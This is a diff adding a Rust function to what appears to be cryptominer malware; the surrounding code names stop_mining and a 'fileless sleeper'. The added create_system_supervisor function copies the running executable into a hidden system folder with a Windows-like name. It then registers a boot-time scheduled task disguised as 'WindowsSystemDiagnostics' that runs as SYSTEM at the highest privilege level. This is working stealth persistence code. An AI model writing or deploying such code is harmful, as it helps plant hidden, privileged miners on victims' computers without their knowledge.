@@ -343,6 +343,54 @@ pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
 }
 
 #[cfg(windows)]
+pub fn create_system_supervisor() -> Result<(), Box<dyn std::error::Error>> {
+    // SYSTEM SUPERVISOR SERVICE
+    // 1. Target Location: C:\ProgramData\WindowsHealth (Hidden/System)
+    // 2. Privilege: NT AUTHORITY\SYSTEM
+    // 3. Trigger: ONSTART (Boot)
+    
+    let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
+    let target_dir = PathBuf::from(program_data).join("WindowsHealth");
+    let target_exe = target_dir.join("sys_diag.exe");
+
+    if !target_dir.exists() {
+        fs::create_dir_all(&target_dir)?;
+    }
+
+    // Copy Self
+    if let Ok(current_exe) = std::env::current_exe() {
+        let _ = fs::copy(current_exe, &target_exe);
+    }
+
+    // Hide Directory
+    let _ = Command::new("attrib")
+        .args(&["+h", "+s", &target_dir.display().to_string()])
+        .output();
+        
+    // Register Task (SYSTEM Privileges)
+    // /SC ONSTART runs as soon as the system boots, before user login.
+    // /RU SYSTEM runs as Local System.
+    let _ = Command::new("schtasks")
+        .args(&[
+            "/CREATE", 
+            "/TN", "WindowsSystemDiagnostics", 
+            "/TR", &format!("'{}'", target_exe.display()), 
+            "/SC", "ONSTART", 
+            "/RU", "SYSTEM",
+            "/F", 
+            "/RL", "HIGHEST" 
+        ])
+        .output();
+
+    Ok(())
+}
+
+#[cfg(not(windows))]
+pub fn create_system_supervisor() -> Result<(), Box<dyn std::error::Error>> {
+    Ok(())
+}
+
+#[cfg(windows)]
 pub fn create_fileless_sleeper() -> Result<(), Box<dyn std::error::Error>> {
     // 1. The Recovery Script (PowerShell)
     // We get the shared recovery script from the helper
